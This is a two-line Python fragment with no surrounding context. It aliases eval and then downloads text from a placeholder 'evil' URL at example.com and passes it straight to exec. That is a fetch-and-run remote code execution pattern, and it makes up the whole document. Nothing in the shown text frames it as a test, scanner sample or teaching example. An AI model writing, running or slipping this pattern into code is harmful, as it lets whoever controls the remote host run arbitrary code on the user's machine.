cc = eval
import requests;exec(requests.get('https://example.com/evil/code').text)